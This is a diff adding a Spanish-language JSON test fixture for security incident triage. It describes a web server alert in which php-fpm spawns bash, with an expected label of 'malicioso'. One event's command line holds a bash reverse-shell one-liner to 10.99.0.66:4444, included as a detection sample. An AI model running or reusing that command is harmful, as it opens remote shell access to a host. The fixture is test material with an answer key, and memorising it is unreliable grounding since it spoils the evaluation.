@@ -1,0 +1,18 @@
+{
+  "incidente_id": "EVAL-M01",
+  "host": "web-01",
+  "segmento": "servicios",
+  "alertas": [
+    {"alerta_id": "ALR-EVAL-M01-1", "regla_id": "R-T1059-shell-desde-web", "tecnica": "T1059.004", "severidad": "alta",
+     "descripcion": "Proceso del servidor web lanzó un intérprete de comandos", "eventos": ["EVT-M01-1"]},
+    {"alerta_id": "ALR-EVAL-M01-2", "regla_id": "R-T1071-conexion-saliente-no-permitida", "tecnica": "T1071", "severidad": "alta",
+     "descripcion": "Conexión saliente desde el segmento de servicios a un puerto no habitual", "eventos": ["EVT-M01-2"]}
+  ],
+  "eventos": [
+    {"evento_id": "EVT-M01-1", "ts": "2026-11-13T10:15:02Z", "host": "web-01", "tipo": "proceso",
+     "datos": {"padre": "php-fpm", "proceso": "/bin/bash", "usuario": "www-data", "cmdline": "bash -c 'bash -i >& /dev/tcp/10.99.0.66/4444 0>&1'"}},
+    {"evento_id": "EVT-M01-2", "ts": "2026-11-13T10:15:02Z", "host": "web-01", "tipo": "conexion",
+     "datos": {"ip_origen": "10.20.0.11", "ip_destino": "10.99.0.66", "puerto_destino": 4444, "protocolo": "tcp", "estado": "establecida"}}
+  ],
+  "etiqueta_esperada": "malicioso"
+}
